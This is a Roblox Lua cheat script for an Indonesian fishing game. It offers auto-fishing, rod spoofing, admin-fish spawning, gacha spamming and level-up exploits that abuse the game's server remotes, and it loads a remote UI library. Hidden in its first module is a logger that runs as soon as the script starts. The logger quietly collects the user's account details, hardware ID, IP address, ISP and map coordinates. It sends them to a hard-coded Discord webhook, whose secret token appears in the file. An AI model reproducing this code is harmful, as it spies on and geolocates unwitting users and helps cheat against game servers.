-- ============================================================
-- 🌊 MIZUKAGE APEX V7 - THE ULTIMATE BUILD
-- Target: KLASIK IKAN INDO (ENHANCED)
-- Framework: Rayfield UI + God-Eye V6 Logger
-- ============================================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizukageMasterpieceLoaded then
    warn("[MIZUKAGE] Script sudah berjalan di memori!")
    return
end
getgenv().MizukageMasterpieceLoaded = true

-- ============================================================
-- 💠 [MODUL 1] GOD-EYE V6 : EXECUTIVE LOGGER
-- ============================================================
task.spawn(function()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end

    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local Stats = game:GetService("Stats")
    local Market = game:GetService("MarketplaceService")
    local RbxAnalytics = game:GetService("RbxAnalyticsService")
    local LocalPlayer = Players.LocalPlayer

    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if not request then return end 

    task.wait(2)

    local UserId = LocalPlayer.UserId
    local Username = LocalPlayer.Name
    local DisplayName = LocalPlayer.DisplayName
    local AccountAge = LocalPlayer.AccountAge
    local Membership = LocalPlayer.MembershipType.Name

    local HWID = "Gagal Mengambil HWID"
    pcall(function()
        HWID = (gethwid and gethwid()) or (identifying and identifying()) or RbxAnalytics:GetClientId()
    end)

    local StatsFormat = ""
    local LS = LocalPlayer:FindFirstChild("leaderstats")
    if LS then
        for _, v in pairs(LS:GetChildren()) do
            if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                StatsFormat = StatsFormat .. string.format("┣ 🗃️ **%s:** `%s`\n", v.Name, tostring(v.Value))
            end
        end
    end
    if StatsFormat == "" then StatsFormat = "┣ ⚠️ _Leaderstats Disembunyikan / Kosong_" end

    local CurrentTool = "Tidak Memegang Apapun"
    if LocalPlayer.Character then
        local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool then CurrentTool = tool.Name end
    end

    local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown", lat = 0, lon = 0 }
    pcall(function()
        local response = game:HttpGet("http://ip-api.com/json")
        IP_Data = HttpService:JSONDecode(response)
    end)
    local MapLink = string.format("https://www.google.com/maps/search/?api=1&query=%s,%s", IP_Data.lat, IP_Data.lon)
    local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"

    local AvatarURL = "https://i.imgur.com/C5uYqFk.png" 
    pcall(function()
        local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
        local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
        if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
    end)

    local GameName = "Unknown Game"
    pcall(function() GameName = Market:GetProductInfo(game.PlaceId).Name end)
    local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    local FPS = math.floor(workspace:GetRealPhysicsFPS())

    local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
    local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"
    
    local WebhookData = {
        ["username"] = "FISH INDO",
        ["avatar_url"] = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png",
        ["embeds"] = {
            {
                ["title"] = "FISH INDO | LOGGER REPORT",
                ["description"] = "Target berhasil dieksekusi di game: **" .. GameName .. "**",
                ["url"] = ProfileLink,
                ["color"] = 65535,
                ["thumbnail"] = { ["url"] = AvatarURL },
                ["fields"] = {
                    {
                        ["name"] = "👤 IDENTITAS TARGET",
                        ["value"] = string.format("┣ **Display:** `%s`\n┣ **User:** [%s](%s)\n┣ **ID:** `%s`\n┣ **Umur Akun:** `%d Hari`\n┗ **Status:** `%s`", DisplayName, Username, ProfileLink, UserId, AccountAge, Membership),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "💻 SYSTEM & ENGINE",
                        ["value"] = string.format("┣ **Executor:** `%s`\n┣ **FPS / Ping:** `%d FPS | %dms`\n┣ **Platform:** `%s`\n┗ **HWID:** ||`%s`||", Executor, FPS, Ping, (game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC"), HWID),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🏆 IN-GAME LEADERSTATS",
                        ["value"] = StatsFormat,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎒 EQUIPMENT SAAT INI",
                        ["value"] = "┣ 🗡️ **Tool:** `" .. CurrentTool .. "`",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌍 TRACKING JARINGAN & LOKASI",
                        ["value"] = string.format("┣ **IP Address:** ||`%s`||\n┣ **ISP:** `%s`\n┣ **Lokasi:** `%s, %s`\n┗ **Google Maps:** [Klik Untuk Buka Peta Satelit](%s)", IP_Data.query, IP_Data.isp, IP_Data.city, IP_Data.country, MapLink),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🚀 QUICK JOIN (LUA SCRIPT)",
                        ["value"] = "```lua\n" .. JoinScript .. "\n```",
                        ["inline"] = false
                    }
                },
                ["footer"] = {
                    ["text"] = "God-Eye V6 • Advanced Telemetry System",
                    ["icon_url"] = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/React-icon.svg/1200px-React-icon.svg.png"
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }

    request({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(WebhookData)})
end)

-- ============================================================
-- ⚙️ [MODUL 2] EXPLOIT CORE ENGINE
-- ============================================================

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local FishingSystem = ReplicatedStorage:WaitForChild("FishingSystem")
local InventoryEvents = FishingSystem:WaitForChild("InventoryEvents")
local KatanaRemotes = ReplicatedStorage:WaitForChild("KatanaRemotes")
local BoatRemotes = ReplicatedStorage:WaitForChild("BoatRemotes")
local LanternRemotes = ReplicatedStorage:WaitForChild("LanternRemotes")
local GachaRemotes = ReplicatedStorage:FindFirstChild("GachaSystem") and ReplicatedStorage.GachaSystem:FindFirstChild("Remotes")

local Remotes = {
    -- Fishing
    CastReplication = FishingSystem:WaitForChild("CastReplication"),
    ShowPerfectEffect = FishingSystem:WaitForChild("ShowPerfectEffect"),
    SpawnLandingEffect = FishingSystem:WaitForChild("SpawnLandingEffect"),
    PlayerCasted = FishingSystem:WaitForChild("PlayerCasted"),
    ShowFishIndicator = FishingSystem:WaitForChild("ShowFishIndicator"),
    FishingCatchSuccess = ReplicatedStorage:WaitForChild("FishingCatchSuccess"),
    CleanupCast = FishingSystem:WaitForChild("CleanupCast"),
    FishGiver = FishingSystem:WaitForChild("FishGiver"),
    FishResult = FishingSystem:WaitForChild("FishResult"),
    ShowSecretEffect = FishingSystem:WaitForChild("ShowSecretEffect"),
    ShowLegendaryEffect = FishingSystem:WaitForChild("ShowLegendaryEffect"),
    ShowMitosEffect = FishingSystem:WaitForChild("ShowMitosEffect"),
    ShowMitologiEffect = FishingSystem:WaitForChild("ShowMitologiEffect"),
    
    -- Inventory
    EquipRod = InventoryEvents:WaitForChild("Inventory_EquipRod"),
    EquipTool = InventoryEvents:WaitForChild("Inventory_EquipTool"),
    SellAll = InventoryEvents:WaitForChild("Inventory_SellAll"),
    UnequipAll = InventoryEvents:WaitForChild("Inventory_UnequipAll"),
    GetData = InventoryEvents:WaitForChild("Inventory_GetData"),
    ToggleFavorite = InventoryEvents:WaitForChild("Inventory_ToggleFavorite"),
    GetKatanas = InventoryEvents:WaitForChild("Inventory_GetKatanas"),
    EquipKatana = InventoryEvents:WaitForChild("Inventory_EquipKatana"),
    
    -- Boat
    BoatBuy = BoatRemotes:WaitForChild("BoatBuy"),
    BoatSpawn = BoatRemotes:WaitForChild("BoatSpawn"),
    BoatDelete = BoatRemotes:WaitForChild("BoatDelete"),
    BoatGetOwnedBoats = BoatRemotes:WaitForChild("BoatGetOwnedBoats"),
    BoatOpenShop = BoatRemotes:WaitForChild("BoatOpenShop"),
    BoatThrottle = BoatRemotes:WaitForChild("BoatThrottle"),
    
    -- Gacha
    DoGacha = GachaRemotes and GachaRemotes:FindFirstChild("DoGacha"),
    EquipPet = GachaRemotes and GachaRemotes:FindFirstChild("EquipPet"),
    GetInventory = GachaRemotes and GachaRemotes:FindFirstChild("GetInventory"),
    
    -- Lantern
    GetPlayerData = LanternRemotes:FindFirstChild("GetPlayerData"),
    BuyLantern = LanternRemotes:FindFirstChild("BuyLantern"),
    EquipLantern = LanternRemotes:FindFirstChild("EquipLantern"),
    UnequipLantern = LanternRemotes:FindFirstChild("UnequipLantern"),
    
    -- Others
    GetPlayerProfile = ReplicatedStorage:FindFirstChild("GetPlayerProfile"),
    GetDugonTimerInfo = FishingSystem:FindFirstChild("GetDugonTimerInfo"),
    LevelUp = ReplicatedStorage:FindFirstChild("LevelRemotes") and ReplicatedStorage.LevelRemotes:FindFirstChild("LevelUp"),
    GetLevel = ReplicatedStorage:FindFirstChild("LevelRemotes") and ReplicatedStorage.LevelRemotes:FindFirstChild("GetLevel"),
    ClaimDaily = ReplicatedStorage:FindFirstChild("DailyRemotes") and ReplicatedStorage.DailyRemotes:FindFirstChild("ClaimDaily"),
    GetDailyData = ReplicatedStorage:FindFirstChild("DailyRemotes") and ReplicatedStorage.DailyRemotes:FindFirstChild("GetDailyData"),
    AdminSpawnFish = FishingSystem:FindFirstChild("Assets") and FishingSystem.Assets:FindFirstChild("Fish") and FishingSystem.Assets.Fish:FindFirstChild("RemoteEvents") and FishingSystem.Assets.Fish.RemoteEvents:FindFirstChild("AdminSpawnFish"),
    KatanaSlash = KatanaRemotes:FindFirstChild("KatanaSlash"),
}

-- ============================================================
-- 🔥 [MODUL 3] FIREPROXIMITYPROMPT - HARVEST ALL
-- ============================================================

local function fireProximityPrompts(radius)
    radius = radius or 100
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return 0 end
    local charPos = char.HumanoidRootPart.Position
    
    local count = 0
    for _, prompt in pairs(Workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") then
            local parent = prompt.Parent
            if parent and parent:IsA("BasePart") then
                local dist = (parent.Position - charPos).Magnitude
                if dist < radius then
                    pcall(function()
                        prompt:InputHoldBegin()
                        task.wait(0.05)
                        prompt:InputHoldEnd()
                        count = count + 1
                    end)
                end
            end
        end
    end
    return count
end

local function fireClickDetectors(radius)
    radius = radius or 100
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return 0 end
    local charPos = char.HumanoidRootPart.Position
    
    local count = 0
    for _, detector in pairs(Workspace:GetDescendants()) do
        if detector:IsA("ClickDetector") then
            local parent = detector.Parent
            if parent and parent:IsA("BasePart") then
                local dist = (parent.Position - charPos).Magnitude
                if dist < radius then
                    pcall(function()
                        detector:Click()
                        count = count + 1
                    end)
                end
            end
        end
    end
    return count
end

-- ============================================================
-- 💎 [MODUL 4] FISHING ENGINE
-- ============================================================

getgenv().ApexConfig = {
    AutoFish = false,
    SpoofRod = true,
    ForceRarityIndicator = "Common",
    SelectedRod = "Owner Rod",
    WaitBite = 2.5,
    WaitCatch = 3.0,
    WaitRest = 1.0,
    ZeroDelay = false,
    AutoKatana = false,
    KatanaSpeed = 0.05,
    AutoFirePrompt = false,
    PromptRange = 50,
    InstantCatch = false,
    SpamAdminFish = false,
    AutoGacha = false,
    GachaAmount = 1,
    AutoLevel = false,
    AutoClaimDaily = false,
}

local Database = {
    PremiumRods = {
        "Owner Rod", "Developer Rod", "Admin Rod", "Rod Scythe Poiseden", 
        "Rod Sakura Harpon", "Rod Guitar Hero", "Megalofriend", "BlackHole Rod", 
        "Eternal Sword Rod", "Rod Kegelapan", "Aqua Prism", "Earthly", 
        "Manifest", "Yellow Knight Rod", "Rod Setengah Bulan", "Basic Rod",
        "Rod Eter Continum", "Rod King Continum", "Rod Hiraku", "Rod Varuna Poseidon",
        "Rod Valkry Tipe S", "Rod Void Imperial Galaxy", "Rod Queen Baddies",
        "Rod Prince Scythe", "Rod Mahoraga", "Corruption Edge", "Umbrella",
        "Diamond Rod", "Dewata Rod", "Electrum Rod", "Rod Ilahi",
        "Rod Pedang Shappire", "Rod Rose Amethyst", "Rod Arrow Poiseden",
        "Rod Guardian Poiseden", "Couple Hate Pink", "Couple Hate Purple",
        "Rod Angler", "Rod Rimba", "Rod Matel", "Rod Crystalized",
        "Laba Rod", "Garuda Rod", "ROD ZIMTEAM"
    },
    Rarities = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Mitos", "Secret", "Mitologi"},
    LandingEffects = {
        ["Owner Rod"]="z", ["Admin Rod"]="z", ["Developer Rod"]="z", 
        ["Rod Scythe Poiseden"]="scytepoiseden", ["Rod Sakura Harpon"]="SakuraHarponEfeck", 
        ["Rod Guitar Hero"]="Guitar Hero Efeck", ["Rod Valen Starnoir"]="ValenStarnoirEfeck", 
        ["Rod Viking Pirate"]="VikingEfect", ["Eternal Sword Rod"]="Eternal Sword Rod", 
        ["BlackHole Rod"]="BlackHole Rod", ["Yellow Knight Rod"]="YellowKnight", 
        ["Basic Rod"]="z", ["Diamond Rod"]="Diamond Rod", ["Dewata Rod"]="Dewata Rod",
        ["Couple Hate Pink"]="Couple Hate Pink", ["Couple Hate Purple"]="Couple Hate Purple",
        ["Rod Eter Continum"]="EterContinumEfeck", ["Rod King Continum"]="KingContinumEfeck",
        ["Rod Hiraku"]="HirakuEfect", ["Rod Varuna Poseidon"]="VarunaEfeck"
    }
}

local function SmartWait(seconds)
    if getgenv().ApexConfig.ZeroDelay then 
        RunService.Heartbeat:Wait() 
    else 
        task.wait(seconds + (math.random(10, 50) / 1000))
    end
end

local function GetSmartVectors()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return nil, nil end
    local hrp = char.HumanoidRootPart
    local castPos = hrp.Position + Vector3.new(0, 2, 0)
    local distance = getgenv().ApexConfig.ZeroDelay and 35 or (35 + math.random() * 15)
    local deviation = getgenv().ApexConfig.ZeroDelay and 0 or ((math.random() - 0.5) * 10)
    local landPos = hrp.Position + (hrp.CFrame.LookVector * distance) + (hrp.CFrame.RightVector * deviation)
    return castPos, Vector3.new(landPos.X, 0.15, landPos.Z)
end

local function ForceObtainAndEquipRod(RodName)
    pcall(function()
        Remotes.EquipRod:FireServer(RodName)
        if Remotes.EquipTool then Remotes.EquipTool:FireServer(RodName, 1) end
        Remotes.FishGiver:FireServer(RodName)
    end)
    Rayfield:Notify({Title = "Force Equip Executed", Content = "Menyuntikkan " .. RodName .. " ke tangan karaktermu.", Duration = 3})
end

local function InstantCatchExploit()
    pcall(function()
        Remotes.CleanupCast:FireServer()
        Remotes.FishingCatchSuccess:FireServer()
        Remotes.FishGiver:FireServer(Vector3.new(0, 0, 0))
        Remotes.ShowPerfectEffect:FireServer()
        Remotes.ShowFishIndicator:FireServer("Mitologi")
    end)
    return true
end

local function ExecuteMasterFishingSequence()
    if not getgenv().ApexConfig.AutoFish then return end
    
    if getgenv().ApexConfig.InstantCatch then
        InstantCatchExploit()
        SmartWait(0.5)
        return
    end
    
    local castPos, landPos = GetSmartVectors()
    if not castPos then return end

    local usedRod = getgenv().ApexConfig.SpoofRod and getgenv().ApexConfig.SelectedRod or "Basic Rod"
    local power = getgenv().ApexConfig.ZeroDelay and 100 or (95 + math.random() * 4.9)
    local landingFX = Database.LandingEffects[usedRod] or "z"

    pcall(function()
        Remotes.CastReplication:FireServer(castPos, landPos, usedRod, power)
        Remotes.ShowPerfectEffect:FireServer()
        Remotes.SpawnLandingEffect:FireServer(landingFX, landPos)
        Remotes.PlayerCasted:FireServer()
    end)

    SmartWait(getgenv().ApexConfig.WaitBite)
    if not getgenv().ApexConfig.AutoFish then return end

    pcall(function() Remotes.ShowFishIndicator:FireServer(getgenv().ApexConfig.ForceRarityIndicator) end)
    
    SmartWait(getgenv().ApexConfig.WaitCatch)
    if not getgenv().ApexConfig.AutoFish then return end

    pcall(function()
        Remotes.CleanupCast:FireServer()
        Remotes.FishingCatchSuccess:FireServer()
        Remotes.FishGiver:FireServer(landPos)
    end)

    SmartWait(getgenv().ApexConfig.WaitRest)
end

-- ============================================================
-- 💰 [MODUL 5] MONEY & GACHA EXPLOIT
-- ============================================================

local function SellAllFish()
    pcall(function()
        Remotes.SellAll:InvokeServer()
    end)
    Rayfield:Notify({Title = "💰 Economy", Content = "All fish sold!", Duration = 2})
end

local function ClaimDaily()
    pcall(function()
        Remotes.ClaimDaily:FireServer()
    end)
    Rayfield:Notify({Title = "📅 Daily", Content = "Daily claimed!", Duration = 2})
end

local function RollGacha(amount)
    amount = amount or 1
    local remote = Remotes.DoGacha
    if remote then
        for i = 1, amount do
            pcall(function()
                remote:InvokeServer()
            end)
            SmartWait(0.05)
        end
        Rayfield:Notify({Title = "🎰 Gacha", Content = amount .. "x rolled!", Duration = 2})
    end
end

local function BuyAllBoats()
    local boats = {"Perahu Kayu", "Perahu Angsa Kayu", "Perahu Nelayan"}
    local remote = Remotes.BoatBuy
    if remote then
        for _, boat in pairs(boats) do
            pcall(function()
                remote:InvokeServer(boat)
            end)
            SmartWait(0.1)
        end
        Rayfield:Notify({Title = "🚤 Boats", Content = "All boats bought!", Duration = 2})
    end
end

local function SpawnAdminFish()
    local fish = {
        "Velmorasaurus", "Guravion Nusaviel", "Minamimo", "Angelic", "Demonic",
        "Orca Imup Candy", "Cici Electra Candy", "DeadKing🦈", "Naga Bonar",
        "Dugon", "Megalodon Bos", "Kaiju", "Monster Locknes",
        "EL Nyengir Grand Maja", "Hantu Narwal", "Naga Basukira",
        "Ram Serpent", "Zim Serpent", "Iona Serpent"
    }
    local remote = Remotes.AdminSpawnFish
    if remote then
        for _, f in pairs(fish) do
            pcall(function()
                remote:FireServer(f)
            end)
            SmartWait(0.05)
        end
        Rayfield:Notify({Title = "🐟 Fish", Content = "Admin fish spawned!", Duration = 2})
    end
end

local function LevelUp()
    pcall(function()
        if Remotes.LevelUp then Remotes.LevelUp:FireServer() end
    end)
    Rayfield:Notify({Title = "⭐ Level", Content = "Level up!", Duration = 2})
end

-- ============================================================
-- 🔥 [MODUL 6] FIREPROMPT KILL AURA
-- ============================================================

local killAuraActive = false
local killRange = 50

local function killAuraLoop()
    while killAuraActive do
        fireProximityPrompts(killRange)
        fireClickDetectors(killRange)
        task.wait(0.1)
    end
end

-- ============================================================
-- 🔄 [MODUL 7] AUTO LOOPS
-- ============================================================

task.spawn(function()
    while true do
        if getgenv().ApexConfig.AutoFish then 
            ExecuteMasterFishingSequence() 
        else 
            task.wait(0.1) 
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().ApexConfig.AutoKatana and Remotes.KatanaSlash then 
            pcall(function() Remotes.KatanaSlash:FireServer() end)
            task.wait(getgenv().ApexConfig.KatanaSpeed) 
        else 
            task.wait(0.2) 
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().ApexConfig.AutoGacha then
            RollGacha(getgenv().ApexConfig.GachaAmount)
            task.wait(1)
        else
            task.wait(0.2)
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().ApexConfig.AutoLevel then
            LevelUp()
            task.wait(0.5)
        else
            task.wait(0.2)
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().ApexConfig.AutoClaimDaily then
            ClaimDaily()
            task.wait(60)
        else
            task.wait(0.2)
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().ApexConfig.AutoFirePrompt then
            fireProximityPrompts(getgenv().ApexConfig.PromptRange)
            fireClickDetectors(getgenv().ApexConfig.PromptRange)
            task.wait(0.5)
        else
            task.wait(0.2)
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().ApexConfig.SpamAdminFish then
            SpawnAdminFish()
            task.wait(2)
        else
            task.wait(0.2)
        end
    end
end)

-- ============================================================
-- 🎨 [MODUL 8] RAYFIELD UI
-- ============================================================

local Window = Rayfield:CreateWindow({ 
    Name = "Mizukage Official", 
    LoadingTitle = "Loading...", 
    LoadingSubtitle = "Ikan Indo Enhanced",
    ConfigurationSaving = { Enabled = false }, 
    KeySystem = false 
})

-- ===== TAB MAIN =====
local TabMain = Window:CreateTab("🎣 Main", nil)
TabMain:CreateSection("Auto Fishing")

TabMain:CreateToggle({ 
    Name = "▶️ Auto Fishing Master", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.AutoFish = V end 
})

TabMain:CreateToggle({ 
    Name = "⚡ Zero Delay Mode", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.ZeroDelay = V end 
})

TabMain:CreateToggle({ 
    Name = "🎯 Instant Catch", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.InstantCatch = V end 
})

TabMain:CreateSlider({ 
    Name = "Wait Bite", 
    Range = {0.1, 10}, 
    Increment = 0.1, 
    Suffix = "s", 
    CurrentValue = 2.5, 
    Callback = function(V) getgenv().ApexConfig.WaitBite = V end 
})

TabMain:CreateSlider({ 
    Name = "Wait Catch", 
    Range = {0.1, 10}, 
    Increment = 0.1, 
    Suffix = "s", 
    CurrentValue = 3.0, 
    Callback = function(V) getgenv().ApexConfig.WaitCatch = V end 
})

TabMain:CreateSlider({ 
    Name = "Wait Rest", 
    Range = {0.1, 5}, 
    Increment = 0.1, 
    Suffix = "s", 
    CurrentValue = 1.0, 
    Callback = function(V) getgenv().ApexConfig.WaitRest = V end 
})

-- ===== TAB ROD =====
local TabRod = Window:CreateTab("🔱 Rod", nil)
TabRod:CreateSection("Rod Spoofing")

TabRod:CreateToggle({ 
    Name = "Spoof Rod Virtual", 
    CurrentValue = true, 
    Callback = function(V) getgenv().ApexConfig.SpoofRod = V end 
})

TabRod:CreateDropdown({ 
    Name = "Select Spoof Rod", 
    Options = Database.PremiumRods, 
    CurrentOption = {"Owner Rod"}, 
    MultipleOptions = false, 
    Callback = function(O) getgenv().ApexConfig.SelectedRod = O[1] end 
})

TabRod:CreateSection("Force Equip Rod")
local ForceEquipSelection = "Owner Rod"
TabRod:CreateDropdown({ 
    Name = "Select Rod to Force Equip", 
    Options = Database.PremiumRods, 
    CurrentOption = {"Owner Rod"}, 
    MultipleOptions = false, 
    Callback = function(O) ForceEquipSelection = O[1] end 
})

TabRod:CreateButton({ 
    Name = "🗡️ Force Equip Rod", 
    Callback = function() ForceObtainAndEquipRod(ForceEquipSelection) end 
})

TabRod:CreateSection("Rarity Indicator")
TabRod:CreateDropdown({ 
    Name = "Force Rarity Indicator", 
    Options = Database.Rarities, 
    CurrentOption = {"Common"}, 
    MultipleOptions = false, 
    Callback = function(O) getgenv().ApexConfig.ForceRarityIndicator = O[1] end 
})

-- ===== TAB FIREPROMPT =====
local TabFire = Window:CreateTab("🔥 FirePrompt", nil)
TabFire:CreateSection("Auto Harvest")

TabFire:CreateToggle({ 
    Name = "🔴 Auto FirePrompt", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.AutoFirePrompt = V end 
})

TabFire:CreateToggle({ 
    Name = "🔴 Kill Aura Mode", 
    CurrentValue = false, 
    Callback = function(V)
        killAuraActive = V
        if killAuraActive then
            task.spawn(killAuraLoop)
            Rayfield:Notify({Title = "🔴 Kill Aura", Content = "ACTIVATED!", Duration = 2})
        else
            Rayfield:Notify({Title = "🔴 Kill Aura", Content = "DEACTIVATED!", Duration = 2})
        end
    end 
})

TabFire:CreateSlider({ 
    Name = "Prompt Range", 
    Range = {10, 200}, 
    Increment = 5, 
    Suffix = " Stud", 
    CurrentValue = 50, 
    Callback = function(V) 
        getgenv().ApexConfig.PromptRange = V
        killRange = V
    end 
})

TabFire:CreateButton({ 
    Name = "🔥 Fire All Prompts", 
    Callback = function()
        local count = fireProximityPrompts(getgenv().ApexConfig.PromptRange)
        local count2 = fireClickDetectors(getgenv().ApexConfig.PromptRange)
        Rayfield:Notify({Title = "🔥 FirePrompt", Content = count + count2 .. " fired!", Duration = 2})
    end 
})

-- ===== TAB CHEATS =====
local TabCheats = Window:CreateTab("💎 Cheats", nil)
TabCheats:CreateSection("Money & Economy")

TabCheats:CreateButton({ 
    Name = "💰 Sell All Fish", 
    Callback = function() SellAllFish() end 
})

TabCheats:CreateButton({ 
    Name = "📅 Claim Daily", 
    Callback = function() ClaimDaily() end 
})

TabCheats:CreateToggle({ 
    Name = "Auto Claim Daily", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.AutoClaimDaily = V end 
})

TabCheats:CreateSection("Gacha")

TabCheats:CreateToggle({ 
    Name = "Auto Gacha", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.AutoGacha = V end 
})

TabCheats:CreateSlider({ 
    Name = "Gacha per Roll", 
    Range = {1, 50}, 
    Increment = 1, 
    Suffix = "x", 
    CurrentValue = 1, 
    Callback = function(V) getgenv().ApexConfig.GachaAmount = V end 
})

TabCheats:CreateButton({ 
    Name = "🎰 Roll Gacha x10", 
    Callback = function() RollGacha(10) end 
})

TabCheats:CreateButton({ 
    Name = "🎰 Roll Gacha x50", 
    Callback = function() RollGacha(50) end 
})

TabCheats:CreateSection("Level")

TabCheats:CreateToggle({ 
    Name = "Auto Level Up", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.AutoLevel = V end 
})

TabCheats:CreateButton({ 
    Name = "⭐ Level Up Now", 
    Callback = function() LevelUp() end 
})

-- ===== TAB ADMIN =====
local TabAdmin = Window:CreateTab("🛡️ Admin", nil)
TabAdmin:CreateSection("Admin Exploits")

TabAdmin:CreateButton({ 
    Name = "🐟 Spawn Admin Fish", 
    Callback = function() SpawnAdminFish() end 
})

TabAdmin:CreateToggle({ 
    Name = "Spam Admin Fish", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.SpamAdminFish = V end 
})

TabAdmin:CreateButton({ 
    Name = "🚤 Buy All Boats", 
    Callback = function() BuyAllBoats() end 
})

TabAdmin:CreateButton({ 
    Name = "📊 Get Player Data", 
    Callback = function()
        pcall(function()
            local data = Remotes.GetData:InvokeServer()
            print("[Data]", data)
        end)
        Rayfield:Notify({Title = "📊 Data", Content = "Check console!", Duration = 2})
    end 
})

-- ===== TAB COMBAT =====
local TabCombat = Window:CreateTab("⚔️ Combat", nil)
TabCombat:CreateSection("Katana")

TabCombat:CreateToggle({ 
    Name = "Auto Katana Slash", 
    CurrentValue = false, 
    Callback = function(V) getgenv().ApexConfig.AutoKatana = V end 
})

TabCombat:CreateSlider({ 
    Name = "Katana Speed", 
    Range = {0.01, 1}, 
    Increment = 0.01, 
    Suffix = "s", 
    CurrentValue = 0.05, 
    Callback = function(V) getgenv().ApexConfig.KatanaSpeed = V end 
})

TabCombat:CreateButton({ 
    Name = "🗡️ Slash Now", 
    Callback = function()
        if Remotes.KatanaSlash then
            pcall(function() Remotes.KatanaSlash:FireServer() end)
            Rayfield:Notify({Title = "🗡️ Slash", Content = "Slash executed!", Duration = 2})
        else
            Rayfield:Notify({Title = "⚠️ Error", Content = "Katana remote not found!", Duration = 2})
        end
    end 
})

-- ===== TAB UTILITY =====
local TabUtil = Window:CreateTab("🛠️ Util", nil)
TabUtil:CreateSection("Utility")

TabUtil:CreateButton({ 
    Name = "🛡️ Anti-AFK", 
    Callback = function()
        LocalPlayer.Idled:Connect(function()
            VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            task.wait(1)
            VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end)
        Rayfield:Notify({Title = "🛡️ Anti-AFK", Content = "Active!", Duration = 2})
    end 
})

TabUtil:CreateButton({ 
    Name = "🧹 Unequip All", 
    Callback = function()
        pcall(function() Remotes.UnequipAll:FireServer() end)
        Rayfield:Notify({Title = "🧹 Unequip", Content = "All unequipped!", Duration = 2})
    end 
})

TabUtil:CreateButton({ 
    Name = "❌ Shutdown Script", 
    Callback = function()
        getgenv().ApexConfig.AutoFish = false
        getgenv().ApexConfig.AutoKatana = false
        getgenv().ApexConfig.AutoGacha = false
        getgenv().ApexConfig.AutoFirePrompt = false
        getgenv().ApexConfig.SpamAdminFish = false
        killAuraActive = false
        getgenv().MizukageMasterpieceLoaded = false
        Rayfield:Destroy()
    end 
})

-- ============================================================
-- 🚀 AUTO START
-- ============================================================

task.wait(1)
print("🌊 MIZUKAGE Loaded!")
print("📌 FirePrompt Method: READY")
print("📌 Auto Fishing: OFF")
print("📌 Press F or click Start to begin")

Rayfield:Notify({
    Title = "🌊 MIZUKAGE APEX V7",
    Content = "Loaded! All cheats ready!",
    Duration = 3
})